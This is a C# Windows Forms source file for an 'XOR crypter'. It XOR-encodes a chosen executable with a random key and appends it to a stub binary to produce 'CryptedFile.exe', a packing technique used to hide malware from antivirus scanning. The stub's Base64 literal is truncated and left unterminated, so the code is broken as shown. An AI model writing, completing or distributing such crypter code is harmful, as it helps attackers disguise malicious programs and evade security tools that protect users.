using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Management;
using System.Security.Cryptography;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace XOR_crypter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        private static byte[] encodeBytes(byte[] bytes, String pass)
        {
            byte[] XorBytes = Encoding.Unicode.GetBytes(pass);

            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] ^= XorBytes[i % 16];
            }

            return bytes;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.ShowDialog();
            string filename = ofd.FileName;

            //stub bytes
            byte[] stub = Convert.FromBase64String("
            string key = Path.GetRandomFileName().Split('.')[0];
            byte[] dataOfEnc = encodeBytes(File.ReadAllBytes(filename), key);
            byte[] base64 = Encoding.UTF8.GetBytes(Convert.ToBase64String(dataOfEnc));
            FileStream fs = new FileStream("CryptedFile.exe", FileMode.CreateNew, FileAccess.Write);
            fs.Write(stub, 0, stub.Length);
            fs.Write(Encoding.UTF8.GetBytes("ssdfsfgvdfju"), 0, Encoding.UTF8.GetBytes("ssdfsfgvdfju").Length);
            fs.Write(Encoding.UTF8.GetBytes(key), 0, Encoding.UTF8.GetBytes(key).Length);
            fs.Write(Encoding.UTF8.GetBytes("ssdfsfgvdfju"), 0, Encoding.UTF8.GetBytes("ssdfsfgvdfju").Length);
            fs.Write(base64, 0, base64.Length);
            fs.Close();

            //close form and exit
            Close();
        }
    }
}
